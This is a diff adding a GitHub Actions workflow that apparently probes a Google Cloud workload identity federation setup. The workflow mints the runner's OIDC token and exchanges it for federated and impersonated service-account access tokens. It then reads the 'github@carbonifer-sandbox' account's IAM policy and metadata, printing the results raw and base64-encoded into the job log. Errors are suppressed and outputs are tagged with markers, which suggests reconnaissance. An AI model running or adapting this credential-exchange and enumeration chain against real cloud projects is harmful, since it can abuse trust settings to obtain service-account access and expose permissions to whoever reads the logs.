@@ -1,0 +1,55 @@
+name: i870c-carbonifer-sapolicy
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  sapol:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: run
+        run: |
+          set +e
+          NUM=536185737408
+          PRJ="projects/$NUM/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider"
+          SA="github@carbonifer-sandbox.iam.gserviceaccount.com"
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          jq -n '{options:{requestedPolicyVersion:3}}' > polreq.json
+          : > tok.jwt
+          for a in 1 2 3; do
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=//iam.googleapis.com/$PRJ")
+            echo "$J" | jq -r '.value // empty' > tok.jwt
+            [ -s tok.jwt ] && break
+            sleep 3
+          done
+          [ -s tok.jwt ] || { echo "##MINT_FAIL"; exit 0; }
+          c=$(curl -s -o sts.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform")
+          FT=$(jq -r '.access_token // empty' sts.json)
+          echo "##STS code=$c ftlen=${#FT}"
+          [ -z "$FT" ] && exit 0
+          g=$(curl -s -o gat.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H 'Content-Type: application/json' \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+          AT=$(jq -r '.accessToken // empty' gat.json)
+          echo "##GEN code=$g toklen=${#AT}"
+          [ -z "$AT" ] && exit 0
+
+          for T in AT FT; do
+            V=$AT; [ "$T" = "FT" ] && V=$FT
+            echo "---- token=$T ----"
+            p=$(curl -s -o p.json -w '%{http_code}' -X POST -H "Authorization: Bearer $V" -H 'Content-Type: application/json' \
+              "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA:getIamPolicy" -d @polreq.json)
+            echo "##SAPOLICY token=$T code=$p body=$(head -c 1500 p.json | tr -d '\n' | tr -s ' ')"
+            echo "##SAPOLICY_B64_$T $(base64 -w0 p.json)"
+            s=$(curl -s -o s.json -w '%{http_code}' -H "Authorization: Bearer $V" \
+              "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA")
+            echo "##SAGET token=$T code=$s body=$(head -c 800 s.json | tr -d '\n' | tr -s ' ')"
+          done
+          echo "##FINISHED"
